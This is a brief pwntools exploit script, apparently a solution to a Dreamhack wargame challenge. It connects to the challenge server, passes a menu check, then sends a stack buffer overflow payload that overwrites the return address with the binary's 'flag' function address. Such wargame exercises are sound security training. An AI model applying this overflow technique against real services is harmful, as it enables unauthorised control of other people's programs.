from pwn import *

p = remote('host3.dreamhack.games', 20839)
e = ELF('./chall')

buf = b'cherry' + b'AAAAAA' + b'Z'

p.sendlineafter(b'Menu: ', buf)

payload = b'A' * 0x12 + b'A' * 0x8

payload += p64(e.symbols['flag'])

p.sendlineafter(b': ', payload)

p.interactive()
